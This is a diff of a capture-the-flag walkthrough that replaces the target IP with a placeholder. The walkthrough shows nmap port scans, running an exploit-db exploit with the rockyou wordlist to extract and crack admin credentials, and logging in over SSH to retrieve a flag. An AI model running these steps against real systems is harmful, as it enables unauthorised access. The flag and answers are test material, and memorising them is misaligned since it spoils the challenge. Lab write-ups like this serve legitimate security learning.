@@ -1,6 +1,6 @@
 ### How many services are running under port 1000?
 ```BASH
-nmap -sV -p1-1000 10.10.149.245
+nmap -sV -p1-1000 VICTIM_IP_ADRESS
 ```
 `-sV` - determine service/version info  
 
@@ -13,7 +13,7 @@ nmap -sV -p1-1000 10.10.149.245
 
 ### What is running on the higher port?
 ```BASH
-nmap -sV -p- 10.10.149.245
+nmap -sV -p- VICTIM_IP_ADRESS
 ```
 ![image](https://github.com/user-attachments/assets/83e955f4-0545-4867-b272-1641190e728c)
 
@@ -35,7 +35,7 @@ nmap -sV -p- 10.10.149.245
 ### What's the password?
 Download the Python exploit from [exploit-db](https://www.exploit-db.com/exploits/46635) and save it as exploit.py. Run the exploit with cracking enabled.
 ```BASH
-python2 exploit.py -u http://10.10.149.245/simple --crack -w /usr/share/wordlists/rockyou.txt
+python2 exploit.py -u http://VICTIM_IP_ADRESS/simple --crack -w /usr/share/wordlists/rockyou.txt
 ```
 The script will extract and crack the admin credentials:  
 
@@ -50,7 +50,7 @@ The script will extract and crack the admin credentials:
 
 ### What's the user flag?
 ```BASH
-ssh mitch@10.10.149.245 -p 2222
+ssh mitch@VICTIM_IP_ADRESS -p 2222
 ```
 ![image](https://github.com/user-attachments/assets/79ea498b-ab33-4b45-83f8-da8ef18a8dcf)
 <pre>G00d j0b, keep up!</pre>
